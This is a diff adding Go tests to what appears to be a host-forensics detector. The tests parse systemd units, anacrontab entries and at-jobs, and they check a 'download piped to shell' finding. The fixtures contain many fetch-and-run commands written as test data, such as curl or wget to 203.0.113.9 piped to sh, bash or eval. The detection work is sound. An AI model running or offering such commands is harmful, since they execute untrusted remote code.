@@ -7,6 +7,7 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 	"unicode/utf16"
 )
 
@@ -281,5 +282,64 @@ func TestSigmaCategoryNeedsItsProvider(t *testing.T) {
 	rs.compileFile("w.yml", []byte("title: w\nlogsource:\n  category: process_creation\ndetection:\n  s:\n    CommandLine|windash|re: ' -enc '\n  condition: s\n"))
 	if rs.Loaded != 0 || len(rs.Skipped) != 1 {
 		t.Fatalf("|windash|re must be skipped, not run half-applied: loaded=%d skipped=%v", rs.Loaded, rs.Skipped)
+	}
+}
+
+func TestUnitExecsCoverEveryExecKey(t *testing.T) {
+	unit := "[Service]\nExecStart=/usr/bin/true\nExecStop=-/bin/sh -c 'curl -s http://203.0.113.9/x | sh'\n" +
+		"ExecCondition=/usr/bin/test -f /x\nExecReload=!!/tmp/.r/run\nEnvironment=A=B\n"
+	got := parseUnitExecs([]byte(unit))
+	if len(got) != 4 || got[1].Key != "ExecStop" || !strings.HasPrefix(got[1].Command, "/bin/sh") || got[3].Command != "/tmp/.r/run" {
+		t.Fatalf("got %+v", got)
+	}
+	if s := parseUnitExecStarts([]byte(unit)); len(s) != 1 || s[0] != "/usr/bin/true" {
+		t.Fatalf("ExecStart lines: %q", s)
+	}
+}
+
+func TestParseAnacrontab(t *testing.T) {
+	data := "SHELL=/bin/sh\n# period delay id command\n1\t5\tcron.daily\trun-parts --report /etc/cron.daily\n" +
+		"@monthly 15 upd /bin/sh -c 'wget -qO- http://203.0.113.9/u | sh'\n"
+	got := parseAnacrontab([]byte(data))
+	if len(got) != 2 || got[0].ID != "cron.daily" || got[1].Period != "@monthly" ||
+		got[1].Command != "/bin/sh -c 'wget -qO- http://203.0.113.9/u | sh'" {
+		t.Fatalf("got %+v", got)
+	}
+}
+
+func TestParseAtJob(t *testing.T) {
+	heredoc := "#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail alice 0\numask 22\nHOME=/home/alice; export HOME\n" +
+		"cd /home/alice || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n" +
+		"${SHELL:-/bin/sh} << 'marcinDELIMITER5e0e4a3b'\ncurl -s http://203.0.113.9/a | bash\n\nmarcinDELIMITER5e0e4a3b\n"
+	j := parseAtJob("a0000a01b6e3c4", []byte(heredoc))
+	if j.UID != "1000" || len(j.Commands) != 1 || j.Commands[0] != "curl -s http://203.0.113.9/a | bash" {
+		t.Fatalf("heredoc job: %+v", j)
+	}
+	if want := time.Unix(0x01b6e3c4*60, 0).UTC(); !j.RunAt.Equal(want) {
+		t.Fatalf("run time %v, want %v", j.RunAt, want)
+	}
+	plain := "#!/bin/sh\n# atrun uid=0 gid=0\ncd /root || {\n exit 1\n}\n/tmp/.x/payload --quiet\n"
+	if j := parseAtJob("=0000201b6e3c4", []byte(plain)); len(j.Commands) != 1 || j.Commands[0] != "/tmp/.x/payload --quiet" {
+		t.Fatalf("plain job: %+v", j)
+	}
+}
+
+func TestDownloadRunThroughSubstitution(t *testing.T) {
+	for cmd, want := range map[string]bool{
+		`bash -c "$(curl -fsSL http://203.0.113.9/i.sh)"`:  true,
+		`sh <(wget -qO- http://203.0.113.9/i.sh)`:          true,
+		`eval "$(curl -s http://203.0.113.9/env)"`:         true,
+		`source <(curl -s http://203.0.113.9/x)`:           true,
+		`. <(curl -s http://203.0.113.9/x)`:                true,
+		"python3 -c \"`curl -s http://203.0.113.9/p.py`\"": true,
+		`$(curl -s http://203.0.113.9/cmd)`:                true,
+		`V=$(curl -s https://api.example.com/version)`:     false,
+		`echo "$(curl -s https://example.com/ip)"`:         false,
+		`jq . <(curl -s https://example.com/a.json)`:       false,
+	} {
+		fs := analyzeUnixCommandLine("test", "", cmd)
+		if got := hasFinding(fs, "exec.download_pipe_shell") != nil; got != want {
+			t.Errorf("%s: fetch-and-run = %v, want %v", cmd, got, want)
+		}
 	}
 }
